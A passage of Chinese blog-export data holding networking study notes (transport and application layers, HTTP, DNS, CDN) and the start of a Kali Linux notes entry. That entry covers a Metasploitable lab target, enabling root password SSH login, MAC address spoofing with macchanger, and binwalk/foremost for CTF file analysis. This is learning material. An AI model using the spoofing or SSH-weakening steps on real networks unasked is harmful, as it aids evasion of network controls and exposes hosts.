id="6-UDP"><a href="#6-UDP" class="headerlink" title="6 UDP"></a>6 UDP</h3><ul><li>报头</li></ul><p><img src="/posts/e255a10a/UDP报头.jpg" alt="img"></p><h3 id="7-拥塞控制"><a href="#7-拥塞控制" class="headerlink" title="7 拥塞控制"></a>7 拥塞控制</h3><ul><li><p>拥塞原因</p><ul><li><p>场景一：没有重传</p><blockquote><p>输入的吞吐量达到了链路带宽的一半。（还有输出占一半）</p></blockquote></li><li><p>场景二：重传</p><blockquote><p>理想化：知道路由器缓冲区大小，发送缓冲区可以接受的大小的包。</p><p>现实：重复发送数据，但是缓冲区接收不了导致丢失，而此时发送端又会发更多的包，导致拥塞。</p></blockquote></li><li><p>场景三：死锁</p><blockquote><p>四个发送端形成循环，形成死锁。</p></blockquote></li></ul></li><li><p>拥塞控制方法</p><ul><li><p>端到端拥塞控制</p><blockquote><p>原理：网络边界（端）自行判断网络是否拥塞。</p></blockquote></li><li><p>网络辅助的拥塞控制</p><blockquote><p>原理：提供网络核心是否拥塞的信息到网络边界（端），网络边界（端）自行调整。</p></blockquote></li></ul></li><li><p>案例</p><ul><li><p>ATM ABR</p><blockquote><p>原理：发生拥塞了就降低发送速度，使其达到最小保障速率。</p><p>发送端发送的RM信元被接收端返回，接收端不做任何改变。</p></blockquote><ul><li>RM：资源管理信源（部署在网络交换机中）<ul><li>NI bit（no increase in rate）：（轻微拥塞）速率不要再增加了</li><li>CI bit（congestion indication）：拥塞指示（网络明显拥塞）</li></ul></li></ul></li></ul></li><li><p>TCP拥塞控制</p></li></ul><h3 id="8-拓展"><a href="#8-拓展" class="headerlink" title="8 拓展"></a>8 拓展</h3><ul><li><p><a href="https://baike.sogou.com/v140748657.htm?fromTitle=QUIC&amp;ch=frombaikevr">QUIC链接</a></p><blockquote><p>（作用于应用层）</p><p>QUIC（Quick UDP Internet Connection）是谷歌制定的一种基于UDP的低时延的互联网传输层协议。</p></blockquote></li><li><p><a href="https://baike.sogou.com/v40658.htm?fromTitle=sctp">SCTP链接</a></p><blockquote><p>SCTP（Stream Control Transmission Protocol）是指流控制传输协议，是在2000年由IETF的SIGTRAN工作组定义的一个传输层协议。</p><p>SCTP是一种提供了可靠、高效、有序的数据传输协议。</p><p>主要的贡献是对多重联外线路的支持，一个端点可以由多于一个 IP地址组成，使得传输可在主机间或网卡间做到透明的网络容错备援。</p></blockquote></li></ul><hr><h2 id="六、应用层"><a href="#六、应用层" class="headerlink" title="六、应用层"></a>六、应用层</h2><h3 id="1-概述-4"><a href="#1-概述-4" class="headerlink" title="1 概述"></a>1 概述</h3><blockquote><p>数据单元（PDU）是报文。</p></blockquote><h3 id="2-端口号"><a href="#2-端口号" class="headerlink" title="2 端口号"></a>2 端口号</h3><blockquote><p><a href="https://zhuanlan.zhihu.com/p/382603934">较全部</a>    <a href="https://blog.csdn.net/qq_35409955/article/details/72598327">端口分类</a></p></blockquote><div class="table-container"><table><thead><tr><th>端口号/实现协议</th><th>端口应用</th></tr></thead><tbody><tr><td>21/tcp</td><td>FTP 文件传输协议</td></tr><tr><td>22/tcp</td><td>SSH 安全登录、文件传送(SCP)和端口重定向</td></tr><tr><td>23/tcp</td><td>Telnet 不安全的文本传送</td></tr><tr><td>25/tcp</td><td>SMTP Simple Mail Transfer Protocol (E-mail)</td></tr><tr><td>69/udp</td><td>TFTP Trivial File Transfer Protocol</td></tr><tr><td>79/tcp</td><td>finger Finger</td></tr><tr><td>80/tcp</td><td>HTTP 超文本传送协议 (WWW)</td></tr><tr><td>88/tcp</td><td>Kerberos Authenticating agent</td></tr><tr><td>110/tcp</td><td>POP3 Post Office Protocol (E-mail)</td></tr><tr><td>113/tcp</td><td>ident old identification server system</td></tr><tr><td>119/tcp</td><td>NNTP used for usenet newsgroups</td></tr><tr><td>220/tcp</td><td>IMAP3</td></tr><tr><td>443/tcp</td><td>HTTPS used for securely transferring web pages</td></tr></tbody></table></div><h3 id="3-Web与HTTP-80-443"><a href="#3-Web与HTTP-80-443" class="headerlink" title="3 Web与HTTP 80 443"></a>3 Web与HTTP 80 443</h3><ul><li><p>Web</p><ul><li>定义：站点链表</li><li>URL：&lt; 协议 &gt; : // &lt; 主机 &gt; : &lt; 端口 &gt; / &lt; 路径 &gt; ? &lt;信息&gt;   （get 请求）</li><li><a href="https://zhuanlan.zhihu.com/p/458974637">请求类型</a></li></ul></li><li><p>HTTP</p><blockquote><p>超文本传输协议。</p><p>无状态协议。</p><p>http 默认端口 80。</p><p>https 默认端口 443。</p></blockquote></li><li><p><a href="https://blog.csdn.net/m0_45861545/article/details/120835738">HTTP 响应头部</a></p><p><img src="/posts/e255a10a/HTTP报头.jpg" alt="img"></p><p><img src="/posts/e255a10a/HTTP报头参数.jpg" alt="img"></p><blockquote><p>Connect：连接状态</p><p>==头部和正文间会有用空白行隔开，代表请求头结束。==</p></blockquote></li><li><p>HTTP响应码</p></li></ul><div class="table-container"><table><thead><tr><th>响应码</th><th>响应内容</th></tr></thead><tbody><tr><td><strong>1XX——信息类（Information）</strong></td><td>表示收到 http 请求，正在进行下一步处理，通常是一种瞬间的响应状态</td></tr><tr><td><strong>2XX——成功类（Successful）</strong></td><td>表示用户请求被正确接收、理解和处理</td></tr><tr><td>200（OK）</td><td>请求成功。一般用于 GET 与 POST 请求</td></tr><tr><td>201（Created）</td><td>已创建。成功请求并创建了新的资源</td></tr><tr><td>202（Accepted）</td><td>接受</td></tr><tr><td><strong>3XX——重定向类（Redirection）</strong></td><td>表示没有请求成功，必须采取进一步的动作</td></tr><tr><td>301（Moved Permanently）</td><td>资源被永久移动。请求的资源已被永久的移动到新 URI，返回信息会包括新的 URI，浏览器会自动定向到新 URI。今后任何新的请求都应使用新的 URI</td></tr><tr><td>302（Found）</td><td>资源临时移动。资源只是临时被移动，客户端应继续使用原有 URI</td></tr><tr><td>304</td><td>用其他策略获取资源</td></tr><tr><td><strong>4XX——客户端错误（Client Error）</strong></td><td>表示客户端提交的请求包含语法错误或不能正确执行</td></tr><tr><td>400（Bad Requests）</td><td>客户端请求的地址不存在或者包含不支持的参数</td></tr><tr><td>401（Unauthorized）</td><td>未授权，或认证失败。对于需要登录的网页，服务器可能返回此响应</td></tr><tr><td>403（Forbidden）</td><td>没权限。服务器收到请求，但拒绝提供服务</td></tr><tr><td>404（Not Found）</td><td>请求的资源不存在。遇到 404 首先检查请求 url 是否正确</td></tr><tr><td><strong>5XX——服务端错误（Server Error）</strong></td><td>表示服务器不能正确执行一个正确的请求（客户端请求的方法及参数是正确的，服务端不能正确执行，如网络超时、服务僵死，可以查看服务端日志再进一步解决）</td></tr><tr><td>500（Internal Server Error）</td><td>服务器内部错误，无法完成请求</td></tr><tr><td>503（Service Unavailable）</td><td>由于超载或系统维护（一般是访问人数过多），服务器无法处理客户端的请求 ，通常这只是暂时状态</td></tr><tr><td>600</td><td>源站没有返回响应头部，只返回实体内容</td></tr></tbody></table></div><ul><li><p>请求类型</p><blockquote><p>GET请求与POST请求的区别：（post请求需要服务器的支持）</p><ol><li>get请求时参数会跟在浏览器地址栏的后面，而post请求不会。（post请求会将数据存放在请求体中）</li><li>get请求相对于post而言，不那么安全。</li><li>get请求传递的数据长度是有限的，而post请求基本没有限制。（长度与服务器相关）</li><li>get请求有缓存（会将数据存放在浏览器中，即本地磁盘中），而post请求无缓存，因此get请求比post请求快。（2倍左右）</li></ol></blockquote><ul><li><p>get</p><blockquote><p>请求指定的页面信息，并返回实体主体。</p></blockquote></li><li><p>post</p><blockquote><p>向指定资源提交数据以处理请求（提交表单或上传文件），数据被包含在请求体中。post可能会导致新资源建立或已有资源的修改。</p></blockquote></li><li><p>head</p><blockquote><p>与get请求相似，但是只返回响应行和响应头，不返回响应正文。</p></blockquote></li><li><p>put</p><blockquote><p>从客户端向服务器传送数据并进行存储或替换。（默认关闭）</p></blockquote></li><li><p>delete</p><blockquote><p>请求删除服务器指定的页面。</p></blockquote></li><li><p>connect</p><blockquote><p>HTTP1.1协议中预留给能够将连接改为管道方式的代理服务器。</p></blockquote></li><li><p>options</p><blockquote><p>允许客户端查看服务器性能。</p></blockquote></li><li><p>trace</p><blockquote><p>回显服务器收到的请求，主要用于测试或诊断。</p></blockquote></li></ul></li><li><p>Cookie与Session</p><ul><li><p>Cookie</p><blockquote><p>客户端将用户登录后的 Cookie 存入客户端的 Cookie 文件中。</p></blockquote></li><li><p>Session</p><blockquote><p>追踪用户状态，Session信息存在服务器端的数据库或文件中。</p></blockquote></li></ul></li></ul><h3 id="4-FTP-20-21"><a href="#4-FTP-20-21" class="headerlink" title="4 FTP 20 21"></a>4 FTP 20 21</h3><ul><li><p>定义</p><blockquote><p>20：FTP数据连接。</p><p>21：FTP控制连接。</p><p>文件传输协议。</p><p>用户名和密码都是明文传输。</p><p>有状态协议。</p><p>控制命令和数据传输分别在两个TCP连接上进行。</p></blockquote></li></ul><h3 id="5-Telent-23"><a href="#5-Telent-23" class="headerlink" title="5 Telent 23"></a>5 Telent 23</h3><h3 id="6-EMail"><a href="#6-EMail" class="headerlink" title="6 EMail"></a>6 EMail</h3><ul><li><p>流程</p><blockquote><p>用户代理&lt;-&gt;邮件服务器—————邮件服务器&lt;-&gt;用户代理</p></blockquote></li><li><p>推邮件</p><ul><li><p>SMTP 25</p><blockquote><p>简单邮件传输协议（传输邮件，也可拉取邮件）</p><p><a href="https://www.cnblogs.com/callmesblog/p/14377467.html">SMTP常用命令</a></p></blockquote></li><li><p>SMTP响应头部</p><ul><li>to：发给</li><li>from：来自</li><li>subject：标题</li><li>cc：副本（其他知道的人）</li><li>编码类型，参数等（同HTTP）</li></ul></li></ul></li><li><p>拉邮件</p></li><li><p>IMAP 143</p><blockquote><p>交互邮件访问协议（拉取邮件）</p></blockquote></li><li><p>POP3 110</p><blockquote><p>邮局协议版本3（拉取邮件）</p></blockquote></li></ul><h3 id="7-DNS-53"><a href="#7-DNS-53" class="headerlink" title="7 DNS    53"></a>7 DNS    53</h3><ul><li><p>定义</p><blockquote><p>域名到IP地址的转化。</p></blockquote></li><li><p>DNS的主要思路</p><ul><li>分层的、基于域的命名机制。</li><li>若干分布式的数据库完成名字到IP地址的转换。</li><li>运行在UDP之上端口号为53的应用服务。</li><li>核心的Internet功能，但以应用层协议实现 。</li><li>在网络边缘处理复杂性。</li></ul></li><li><p>DNS的主要目的</p><blockquote><p>实现主机名-IP地址的转换。(name/IP translate)</p></blockquote></li><li><p>DNS的其它目的 </p><blockquote><p>主机别名到规范名字的转换：Host aliasing </p><p>邮件服务器别名到邮件服务器的正规名字的转换：Mail server aliasing </p><p>负载均衡：Load Distribution</p></blockquote></li><li><p><a href="https://blog.csdn.net/shaoz/article/details/6785120">常用顶级域名</a></p></li></ul><div class="table-container"><table><thead><tr><th>顶级域名</th><th>表示</th></tr></thead><tbody><tr><td>.com</td><td>商业机构</td></tr><tr><td>.net</td><td>网络服务机构</td></tr><tr><td>.org</td><td>非盈利性组织</td></tr><tr><td>.gov</td><td>政府机构</td></tr><tr><td>.edu</td><td>教育机构</td></tr><tr><td>.mil</td><td>军事机构</td></tr><tr><td>.biz</td><td>商业机构</td></tr><tr><td>.name</td><td>个人网站</td></tr><tr><td>.info</td><td>信息提供</td></tr><tr><td>.mobi</td><td>专用手机域名</td></tr><tr><td>.pro</td><td>医生，会计师</td></tr><tr><td>.travel</td><td>旅游网站</td></tr><tr><td>.museum</td><td>博物馆</td></tr><tr><td>.int</td><td>国际机构</td></tr><tr><td>.areo</td><td>航空机构</td></tr><tr><td>.post</td><td>邮政机构</td></tr><tr><td>.rec</td><td>娱乐机构</td></tr><tr><td>.asia</td><td>亚洲机构</td></tr><tr><td>.cc</td><td>商业公司或者中国公司</td></tr><tr><td><strong>二级域名</strong></td><td><strong>表示</strong></td></tr><tr><td>arts</td><td>艺术类机构</td></tr><tr><td>com</td><td>商业机构</td></tr><tr><td>edu</td><td>教育及研究机构</td></tr><tr><td>firm</td><td>公司企业</td></tr><tr><td>gov</td><td>政府机构</td></tr><tr><td>info</td><td>信息服务</td></tr><tr><td>net</td><td>网络服务机构</td></tr><tr><td>nom</td><td>个人</td></tr><tr><td>org</td><td>专业团体</td></tr><tr><td>rec</td><td>娱乐类机构</td></tr><tr><td>store</td><td>销售类公司企业</td></tr><tr><td>web</td><td>从事WWW活动的机构</td></tr></tbody></table></div><ul><li><p>DNS记录</p><blockquote><ul><li>资源记录(resource records)（RR）</li></ul><p>作用：维护 域名-IP地址(其它)的映射关系<br>位置：Name Server的分布式数据库中</p><ul><li>本地服务器</li></ul><p>缓存：提高性能。<br>删除：保持一致性。</p></blockquote></li><li><p>RR格式(domain_name, ttl, type,class,Value)</p><ul><li><p>Domain_name: 域名</p></li><li><p>Ttl: time to live : 生存时间(权威，缓冲记录)</p></li><li><p>Class 类别 ：对于Internet，值为IN</p></li><li><p>Value 值：可以是数字，域名或ASCII串</p></li><li><p>Type 类别</p><ul><li><p>Type=A </p><blockquote><p>Name为主机 。</p><p>Value为IP地址。</p></blockquote></li><li><p>Type=CNAME </p><blockquote><p>Name为规范名字的别名 。<br>例：www.ibm.com的规范名字为servereast.backup2.ibm.com</p><p> value 为规范名字。</p></blockquote></li><li><p>Type=NS </p><blockquote><p>Name域名，例：foo.com。</p><p>Value为该域名的权威服务器的域名。</p></blockquote></li><li><p>Type=MX </p><blockquote><p>Value为name对应的邮件服务器的名字。</p></blockquote></li></ul></li></ul></li><li><p>查询</p><ul><li><p>步骤：</p><blockquote><p>application ——- resolver —（解析器发送的包封装在UDP段）—- Local Name Server</p></blockquote></li><li><p>方法：</p><ul><li>递归查询（服务器依次查，从顶开始）</li><li>迭代查询（客户端依次查，从顶开始）</li></ul></li></ul></li><li><p>DNS协议报文</p><blockquote><p>DNS协议：查询和响应报文的报文格式相同。</p></blockquote><ul><li>报文首部<ul><li>（2B）identification：标识符（ID），16位。</li><li>（2B）flags：查询/应答 ，希望递归 ，递归可用 ，应答为权威。</li><li>（2B）# questions</li><li>（2B）# answer RRs</li><li>（2B）# authority RRs</li><li>（2B）# additional RRs </li><li>（4B）questions (variable # of questions)：一个查询的Name, type字段。</li><li>（4B）answers (variable # of RRs)：对应查询的RR记录。</li><li>（4B）authority (variable # of RRs)：权威服务器的记录。</li><li>（4B）additional info (variable # of RRs)：附加的有用信息。</li></ul></li></ul></li></ul><h3 id="8-P2P"><a href="#8-P2P" class="headerlink" title="8 P2P"></a>8 P2P</h3><ul><li><p>结构类型</p><ul><li><p>非结构化P2P</p><ul><li><p>集中化目录</p><blockquote><p>存在中央服务器。</p></blockquote></li><li><p>完全分布式</p><blockquote><p>分布式。</p></blockquote></li><li><p>混合体</p><blockquote><p>存在组员和组长。</p></blockquote></li></ul></li><li><p>DHT（结构化）P2P</p><blockquote><p>IP地址变成十六进制值，从小到大依次连接形成一个环。</p></blockquote></li><li><p>P2P文件分发： <a href="https://zhuanlan.zhihu.com/p/364041702">BitTorrent</a>（种子后缀 .torrent）</p></li></ul></li></ul><h3 id="9-视频流化服务与CDN"><a href="#9-视频流化服务与CDN" class="headerlink" title="9 视频流化服务与CDN"></a>9 视频流化服务与CDN</h3><blockquote><p><a href="https://www.cnblogs.com/ziyuemeng/p/13387782.html">CDN </a></p><p><a href="https://zhuanlan.zhihu.com/p/598696740">正向代理与反向代理</a></p></blockquote><ul><li><p>定义</p><blockquote><p>视频流化服务（杀手级业务：占据互联网大部分流量）</p><p>CDN是把原本需要集中获取的资源缓存到边缘节点，使用户就近访问。通过在网络中增加一层缓存层，通过全局负载技术将源站的资源分发到里用户最近的网络边缘节点上，使缓存服务器响应用户请求，从而达到快速访问的目的。</p></blockquote></li><li><p>编码</p><ul><li>时间冗余：同张图片图像不同位置。</li><li>空间冗余：不同图片图像不同位置。</li></ul></li><li><p>多媒体流化服务：DASH</p><blockquote><p>DASH: Dynamic, Adaptive Streaming over HTTP。</p></blockquote><ul><li><p>服务器</p><blockquote><p>将视频文件分割成多个块 。</p><p>每个块独立存储，编码于不同码率。（8-10种） </p><p>告示文件（manifest file）: 提供不同块的URL。</p></blockquote></li><li><p>客户端</p><blockquote><p>先获取告示文件 。</p><p>周期性地测量服务器到客户端的带宽。</p><p>查询告示文件,在一个时刻请求一个块，HTTP头部指定字节范围，如果带宽足够，选择最大码率的视频块<br>会话中的不同时刻，可以切换请求不同的编码块。 （取决于当时的可用带宽）</p></blockquote></li><li><p>“智能”客户端</p><blockquote><p>客户端自适应决定什么时候去请求块 。（不至于缓存挨饿，或者溢出）</p><p>请求什么编码速率的视频块。（当带宽够用时，请求高质量的视频块）</p><p>哪里去请求块。（可以向离自己近的服务器发送URL，或者向高可用带宽的服务器请求）</p></blockquote></li></ul></li></ul><h3 id="10-DHCP"><a href="#10-DHCP" class="headerlink" title="10 DHCP"></a>10 DHCP</h3><h3 id="11-套接字编程"><a href="#11-套接字编程" class="headerlink" title="11 套接字编程"></a>11 套接字编程</h3><blockquote><p><a href=".\4962e50b">text::C语言Windows网络编程</a> </p></blockquote><hr><h2 id="七、补充"><a href="#七、补充" class="headerlink" title="七、补充"></a>七、补充</h2><h3 id="1-无线网络"><a href="#1-无线网络" class="headerlink" title="1 无线网络"></a>1 无线网络</h3><h3 id="2-网络安全"><a href="#2-网络安全" class="headerlink" title="2 网络安全"></a>2 网络安全</h3><h3 id="3-网络中的音频和视频"><a href="#3-网络中的音频和视频" class="headerlink" title="3 网络中的音频和视频"></a>3 网络中的音频和视频</h3>]]></content>
      
      
      <categories>
          
          <category> 网络安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 概述 </tag>
            
            <tag> 计算机网络 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Kali Linux</title>
      <link href="/posts/c5fc2764.html"/>
      <url>/posts/c5fc2764.html</url>
      
        <content type="html"><![CDATA[<h1 id="Kali-Linux"><a href="#Kali-Linux" class="headerlink" title="Kali Linux"></a>Kali Linux</h1><blockquote><p><a href="https://www.kali.org/">official::Kali安装</a></p><p><a href="https://www.bilibili.com/video/BV1sN4y1u7qv/">视频</a></p><p><a href=".\57602ae6">text::Ubuntu Linux</a> </p><p><a href=".\5cfe0bd9">text::Web渗透工具</a></p><p><a href=".\54924480">text::Web渗透</a> </p></blockquote><hr><h2 id="〇、靶机"><a href="#〇、靶机" class="headerlink" title="〇、靶机"></a>〇、靶机</h2><ul><li><p>Metasploitable2-Linux</p><blockquote><p><a href="https://sourceforge.net/projects/metasploitable/">靶机下载</a></p><p><a href="https://www.jianshu.com/p/bf79945a017a">靶机配置</a></p></blockquote><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 设置静态ip </span></span><br><span class="line">vim /etc/network/interfaces</span><br><span class="line">(i) dhcp -&gt; static</span><br><span class="line">address 192.168.1.180</span><br><span class="line">netmask 255.255.255.0</span><br><span class="line">gateway 192.168.1.1</span><br><span class="line">(::wq)</span><br><span class="line">/etc/init.d/networking restart <span class="comment"># 重启网卡</span></span><br></pre></td></tr></table></figure></li></ul><hr><h2 id="一、Kali基础"><a href="#一、Kali基础" class="headerlink" title="一、Kali基础"></a>一、Kali基础</h2><h3 id="1-root权限"><a href="#1-root权限" class="headerlink" title="1 root权限"></a>1 root权限</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 一次执行</span></span><br><span class="line">sudo</span><br><span class="line"><span class="comment"># 切换身份</span></span><br><span class="line">sudo -i</span><br></pre></td></tr></table></figure><h3 id="2-工具安装"><a href="#2-工具安装" class="headerlink" title="2 工具安装"></a>2 工具安装</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 更新apt-get</span></span><br><span class="line">sudo apt-get update</span><br><span class="line"><span class="comment"># 获得包</span></span><br><span class="line">apt-cache search &lt;packet&gt;</span><br><span class="line"><span class="comment"># 安装包</span></span><br><span class="line">sudo apt-get install &lt;packet&gt;</span><br><span class="line"></span><br><span class="line">kali-linux-full <span class="comment"># 常见工具包</span></span><br><span class="line">kali-linux-all <span class="comment"># 所有工具包</span></span><br><span class="line">kali-linux-forensic <span class="comment"># 取证工具包</span></span><br><span class="line">kali-linux-wireless <span class="comment"># 无线渗透包</span></span><br></pre></td></tr></table></figure><h3 id="3-命令安装"><a href="#3-命令安装" class="headerlink" title="3 命令安装"></a>3 命令安装</h3><ul><li>help</li><li><a href="https://zhuanlan.zhihu.com/p/192453637">Bashtop安装和使用</a></li></ul><h3 id="4-查找文件"><a href="#4-查找文件" class="headerlink" title="4 查找文件"></a>4 查找文件</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 查找所有文件（无db用updatedb进行更新）</span></span><br><span class="line">locate &lt;name&gt;</span><br><span class="line"><span class="comment"># 查找二进制文件</span></span><br><span class="line">whereis &lt;name&gt;</span><br><span class="line"><span class="comment"># 查找可执行文件</span></span><br><span class="line"><span class="built_in">which</span> &lt;name&gt;</span><br><span class="line"><span class="comment"># 查找路径下文件</span></span><br><span class="line">find [option] [path] [filename]</span><br></pre></td></tr></table></figure><h3 id="5-网络设置"><a href="#5-网络设置" class="headerlink" title="5 网络设置"></a>5 网络设置</h3><blockquote><p>图形化界面：右上角网络配置——右键</p></blockquote><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 网络配置</span></span><br><span class="line">ifconfig</span><br><span class="line"><span class="comment"># 网络信息</span></span><br><span class="line">ip addr</span><br><span class="line"><span class="comment"># 路由信息</span></span><br><span class="line">ip route</span><br></pre></td></tr></table></figure><h3 id="6-远程登录"><a href="#6-远程登录" class="headerlink" title="6 远程登录"></a>6 远程登录</h3><blockquote><p><a href="https://www.cnblogs.com/lzkalislw/p/15153943.html">开启ssh</a></p></blockquote><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># vim：i：插入模式，esc：退出，:：底线命令模式，wq：保存并退出。</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 1.打开SSH配置文件</span></span><br><span class="line">sudo vim/leafpad /etc/ssh/sshd_config</span><br><span class="line"><span class="comment"># 2.去除下列井号并把no改为yes：</span></span><br><span class="line">PermitRootLogin prohibit-password <span class="built_in">yes</span></span><br><span class="line">PasswordAuthentication <span class="built_in">yes</span></span><br><span class="line"></span><br><span class="line">/etc/init.d/ssh status <span class="comment"># 查看ssh服务状态</span></span><br><span class="line">/etc/init.d/ssh start  <span class="comment"># 开启ssh服务</span></span><br><span class="line">/etc/init.d/ssh stop <span class="comment"># 关闭ssh服务</span></span><br></pre></td></tr></table></figure><h3 id="7-其他命令"><a href="#7-其他命令" class="headerlink" title="7 其他命令"></a>7 其他命令</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 收集信息</span></span><br><span class="line">whois &lt;url&gt;</span><br></pre></td></tr></table></figure><h3 id="8-MAC伪造"><a href="#8-MAC伪造" class="headerlink" title="8 MAC伪造"></a>8 MAC伪造</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 1.关闭网卡</span></span><br><span class="line">ifconfig wlan0 down</span><br><span class="line"><span class="comment"># 2.随机生成mac</span></span><br><span class="line">macchanger -r wlan0</span><br><span class="line"><span class="comment"># 2.指定mac</span></span><br><span class="line">macchanger -m 01:23:45:67:89:10 wlan0</span><br><span class="line"><span class="comment"># 3.开启网卡</span></span><br><span class="line">ifconfig wlan0 up</span><br></pre></td></tr></table></figure><h3 id="9-OpenSSL"><a href="#9-OpenSSL" class="headerlink" title="9 OpenSSL"></a>9 <a href="https://zhuanlan.zhihu.com/p/107741096">OpenSSL</a></h3><blockquote><p>生成和验证证书。</p></blockquote><h3 id="10-工具管理"><a href="#10-工具管理" class="headerlink" title="10 工具管理"></a>10 工具管理</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 开始菜单添加</span></span><br><span class="line">/usr/share/applications/</span><br><span class="line"><span class="comment"># 修改文件内容</span></span><br><span class="line">/usr/share/applications/&lt;name&gt;.desktop</span><br><span class="line"></span><br><span class="line"><span class="comment"># 添加内容：</span></span><br><span class="line">[Desktop Entry]</span><br><span class="line">Name=&lt;name&gt; <span class="comment"># 填</span></span><br><span class="line">Comment=&lt;comment&gt; <span class="comment"># 可填</span></span><br><span class="line">Encoding=UTF-8</span><br><span class="line">Exec=/usr/bin/&lt;name&gt; <span class="comment"># 路径（不在可以用 lcoate 进行寻找）</span></span><br><span class="line">Icon=kali--menu <span class="comment"># 有图标可以修改</span></span><br><span class="line">StartupNotify=<span class="literal">false</span></span><br><span class="line">Terminal=<span class="literal">true</span></span><br><span class="line">Type=Application</span><br><span class="line">Categories=&lt;categories&gt; <span class="comment"># 工具栏位置（例：01-01-dns-analysis（尾部分号隔开））</span></span><br></pre></td></tr></table></figure><hr><h2 id="二、Misc"><a href="#二、Misc" class="headerlink" title="二、Misc"></a>二、Misc</h2><h3 id="1-命令技巧"><a href="#1-命令技巧" class="headerlink" title="1 命令技巧"></a>1 命令技巧</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 查询 file 中的关键字 flag</span></span><br><span class="line">strings &lt;file&gt; | grep &lt;flag&gt;</span><br></pre></td></tr></table></figure><h3 id="2-binwalk：识别、提取等文件操作"><a href="#2-binwalk：识别、提取等文件操作" class="headerlink" title="2 binwalk：识别、提取等文件操作"></a>2 binwalk：识别、提取等文件操作</h3><ul><li><p>签名扫描选项</p><ul><li>-B，-签名扫描目标文件的通用文件签名。</li><li>-R，-raw=扫描目标文件中指定的字节序列。</li><li>-A，-opcodes扫描目标文件中常见的可执行操作码签名。</li><li>-m，-magic=指定要使用的自定义魔术文件。</li><li>-b，-dumb禁用智能签名关键字。</li><li>-I，-invalid显示标记为无效的结果。</li><li>-x，-exclude=排除匹配&lt; str &gt;的结果。</li><li>-y，-include=仅显示匹配&lt; str &gt;的结果。</li></ul></li><li><p>提取选项</p><ul><li>-e，-extract自动提取已知的文件类型。</li><li>-D，-dd=提取\<type\>签名（正则表达式），赋予文件扩展名\<ext\>，然后执行\<cmd\>。</cmd\></ext\></type\></li><li>-M，-matryoshka递归扫描提取的文件。</li><li>-d，-depth=限制matryoshka递归深度。（默认值:8级深度）</li><li>-C，-directory=将文件/文件夹提取到自定义。（目录默认:当前工作目录）</li><li>-j，-size=限制每个提取文件的大小。</li><li>-n， count=限制解压缩文件的数量。</li><li>-0，-run-as=使用指定用户的权限执行外部提取实用程序。</li><li>-l，-preserve-symlinks不整理指向提取目录之外的提取的符号链接。（危险）</li><li>-r，-rm提取后删除雕刻的文件。</li><li>-z，-从文件中提取数据，但不执行提取实用程序。</li><li>-V，-子目录提取到由偏移量命名的子目录中。</li></ul></li><li><p>熵选项</p><ul><li>-E，-熵计算文件熵。</li><li>-F，-fast使用更快但不太详细的熵分析。</li><li>-J，-将保存图保存为PNG。</li><li>-Q，-nlegend省略熵图中的图例。</li><li>-N，-N请勿生成熵绘图。</li><li>-H，-high=设置上升沿熵触发阈值。（默认值:0.95）</li><li>-L，-low=设置下降沿熵触发阈值。（默认值:0.85）</li></ul></li><li><p>二进制差异选项</p><ul><li>-W，-hexdump对一个或多个文件执行hexdump / diff。</li><li>-G，-green仅显示包含所有文件中相同字节的行。</li><li>-i，-red只显示包含所有文件中不同字节的行。</li><li>-U，-blue仅显示包含不同字节的行，这些字节在某些文件中是不同的。</li><li>-u，-similar仅显示所有文件之间相同的行。</li><li>-w，-terse区分所有文件，但只显示第一个文件的十六进制转储。</li></ul></li><li><p>原始压缩选项</p><ul><li>-X，-deflate扫描原始deflate压缩流。</li><li>-Z，-lzma扫描原始lzma压缩流。</li><li>-P，-partial执行一次表面但更快的扫描。</li><li>-S，-stop在第一个结果后停止。</li></ul></li><li><p>常规选项</p><ul><li>-l，-length=要扫描的字节数。</li><li>-o，-offset=在此文件偏移量处开始扫描。</li><li>-O，-base=向所有打印的偏移量添加基址。</li><li>-K，-block=设置文件块大小。</li><li>-g，-swap=扫描前每n个字节反转一次。</li><li>-f，- log=将结果记录到文件中。</li><li>-c，-csv将结果记录到csv格式的文件中。</li><li>-t，-term格式输出以适应终端窗口。</li><li>-q，-quiet抑制输出到stdout。</li><li>-v，-verbose启用详细输出。</li><li>-h，-help显示帮助输出。</li><li>-a，-finclude=仅扫描名称与此regex匹配的文件。</li><li>-p，-fexclude=不扫描名称与此正则表达式匹配的文件。</li><li>-s，-status=在指定端口上启用状态服务器。</li></ul></li><li><p>案例</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 识别结构</span></span><br><span class="line">binwalk &lt;file&gt;</span><br><span class="line"><span class="comment"># 提取文件</span></span><br><span class="line">sudo binwalk -e --run-as=root &lt;file&gt;</span><br></pre></td></tr></table></figure></li></ul><h3 id="3-foremost：用于分离文件"><a href="#3-foremost：用于分离文件" class="headerlink" title="3 foremost：用于分离文件"></a>3 foremost：用于分离文件</h3><ul><li><p>选项</p><ul><li>-h，帮助。</li><li>-V，-显示版权信息并退出。</li><li>-t，-指定文件类型。（-t jpeg，pdf…）</li><li>-d，-打开间接块检测。(对于UNIX文件系统)</li><li>-i，-指定输入文件。（默认为stdin）</li><li>-a，-写入所有标头，不执行错误检测。（损坏的文件）</li><li>-w，-仅写入审核文件，不将任何检测到的文件写入磁盘。</li><li>-o，-设置输出目录。（默认为输出）</li><li>-c，-设置要使用的配置文件。（默认为foremost.conf）</li><li>-q，-启用快速模式。在512字节边界上执行搜索。</li><li>-Q，-启用安静模式。禁止输出消息。</li><li>-v，-详细模式。将所有消息记录到屏幕上。</li></ul></li><li><p>案例</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 分离到 output 中</span></span><br><span class="line">foremost 